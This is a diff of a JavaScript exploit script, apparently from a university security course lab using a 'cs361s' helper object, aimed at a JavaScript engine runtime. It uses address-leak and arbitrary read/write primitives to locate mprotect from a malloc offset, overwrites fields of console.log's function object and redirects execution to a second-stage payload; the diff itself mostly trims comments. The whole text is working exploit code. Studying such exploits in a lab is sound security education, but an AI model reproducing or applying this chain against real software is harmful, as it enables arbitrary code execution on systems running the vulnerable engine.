@@ -14,7 +14,7 @@ let second_stage =
  * NEED TO FIND WHERE MPROTECT IS
  */
 
-// ctx->rt->mf.js_malloc_usable_size
+// ctx -> rt -> js malloc usable size
 let addressconsole = cs361s.addrof(console.log);
 let ctx = cs361s.readmem(addressconsole + 48);
 let rt = cs361s.readmem(ctx + 24);
@@ -35,9 +35,8 @@ let addressmprotect = gameofthrones - 0x31B00;//difference between malloc and pr
  */
 let secondstageaddress = cs361s.addrof(second_stage);
 
-cs361s.writemem(addressconsole + 48, secondstageaddress); // overwrite realm
+cs361s.writemem(addressconsole + 48, secondstageaddress);
 cs361s.writemem(addressconsole + 56, addressmprotect);
 console.log.apply(2.0237e-320, null); //change num to be x10 power of -320
-// Execute Payload
-cs361s.writemem(addressconsole + 56, secondstageaddress + 16); // start of string + 16 
+cs361s.writemem(addressconsole + 56, secondstageaddress + 16); 
 console.log();
